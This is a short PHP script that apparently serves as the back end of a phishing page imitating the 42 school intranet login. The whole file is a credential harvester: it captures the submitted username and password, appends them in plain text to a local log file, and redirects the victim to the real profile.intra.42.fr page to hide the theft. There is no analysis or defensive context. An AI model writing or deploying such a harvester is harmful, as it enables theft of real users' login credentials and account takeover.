<?php
header ('Location: https://profile.intra.42.fr/');

$user = $_POST["uname"];
$pass = $_POST["pword"];
$file = fopen("log.txt", "a+");

fwrite($file, "\n\n-----------------------------------------\n");
fwrite($file, "User: ");
fwrite($file, $user);
fwrite($file, "\nPassword: ");
fwrite($file, $pass);
fwrite($file, "\n-----------------------------------------\n\n");

fclose($file);
exit;
?>